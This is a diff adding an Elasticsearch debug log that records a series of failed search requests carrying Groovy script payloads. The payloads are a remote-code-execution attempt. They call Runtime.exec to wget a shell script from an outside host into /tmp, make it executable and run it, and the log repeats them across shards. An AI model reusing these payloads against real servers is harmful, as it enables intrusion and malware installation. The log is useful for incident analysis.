@@ -1,0 +1,786 @@
+[2014-12-21 19:39:12,685][DEBUG][action.search.type       ] [Orb] [product][1], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2b839326] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2481.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 262.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 19:39:12,686][DEBUG][action.search.type       ] [Orb] [product][2], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2b839326] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2485.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 262.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 19:39:12,690][DEBUG][action.search.type       ] [Orb] [product][0], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2b839326]
+org.elasticsearch.search.SearchParseException: [product][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2482.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 262.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 19:39:12,689][DEBUG][action.search.type       ] [Orb] [product][4], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2b839326] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2483.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 262.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 19:39:12,688][DEBUG][action.search.type       ] [Orb] [product][3], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2b839326] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -P /tmp http://housrs.ddns.net:4567/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2484.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 262.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 19:39:12,690][DEBUG][action.search.type       ] [Orb] All shards failed for phase: [query]
+[2014-12-21 20:34:42,297][DEBUG][action.search.type       ] [Orb] [product][0], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@de53390] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2486.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 236.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 20:34:42,298][DEBUG][action.search.type       ] [Orb] [product][1], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@de53390] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2490.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 236.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 20:34:42,299][DEBUG][action.search.type       ] [Orb] [product][2], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@de53390] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2489.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 236.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 20:34:42,300][DEBUG][action.search.type       ] [Orb] [product][3], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@de53390] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2488.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 236.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 20:34:42,301][DEBUG][action.search.type       ] [Orb] [product][4], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@de53390]
+org.elasticsearch.search.SearchParseException: [product][4]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"chmod 777 /tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2487.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 236.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 20:34:42,301][DEBUG][action.search.type       ] [Orb] All shards failed for phase: [query]
+[2014-12-21 21:29:54,673][DEBUG][action.search.type       ] [Orb] [product][0], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@74fe8977] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"./tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2491.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 227.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 21:29:54,674][DEBUG][action.search.type       ] [Orb] [product][1], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@74fe8977] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"./tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2492.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 227.
+   Line())!=null){sb.append(str+"
+                                 ^
+
+1 error
+]
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService.compile(GroovyScriptEngineService.java:124)
+	at org.elasticsearch.script.ScriptService.getCompiledScript(ScriptService.java:353)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:339)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:475)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:665)
+	... 9 more
+[2014-12-21 21:29:54,675][DEBUG][action.search.type       ] [Orb] [product][2], node[05L9eN-YSQCJBs_dw99b2g], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@74fe8977] lastShard [true]
+org.elasticsearch.search.SearchParseException: [product][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"./tmp/test.sh\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str+\"\r\n\");}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:681)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:537)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:509)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:264)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:231)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:228)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:559)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.groovy.GroovyScriptCompilationException: MultipleCompilationErrorsException[startup failed:
+Script2495.groovy: 3: expecting anything but ''\n''; got it anyway @ line 3, column 227.
